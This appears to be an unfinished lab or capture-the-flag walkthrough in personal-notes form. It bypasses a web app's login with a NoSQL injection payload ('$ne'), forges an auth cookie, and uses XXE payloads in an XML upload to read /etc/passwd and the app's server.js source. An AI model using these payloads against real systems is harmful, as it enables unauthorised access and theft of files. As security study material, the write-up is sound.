#Incomplete
![[Pasted image 20250426164013.png]]

[[nmap]] reports a port 5000 open with a web page running where we found a login section.

![[Pasted image 20250426164101.png]]

Use [[NoSQL Injection]] to bypass the authentication in [[Burpsuite]]

```json
{"user": "admin", "password": { "$ne": "pass" } }
```

change the `Content-type` to `application/json` and send that content and you see in the response the app wants set a cookie called `auth`

![[Pasted image 20250426164802.png]]

Create that cookie with that content on the browser and you see new content.

![[Pasted image 20250426164911.png]]

those buttons were not.

if we try upload a file the web app say us need have this [[xml]] format:

```xml
<post><title>Example Post</title><description>Example Description</description><markdown>Example Markdown</markdown></post>
```

so we can try event [[XML External Entity (XXE)]] with the next payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<post><title>Example Post</title><description>Example Description</description><markdown>&file;</markdown></post>
```

![[Pasted image 20250426170142.png]]

we can read `/etc/passwd`, now we can try read the file are running the webpage.

```xml
<!DOCTYPE data [
	<!ENTITY file SYSTEM "file:///opt/blog/server.js">
]
```

and we got the content.

![[Pasted image 20250426171048.png]]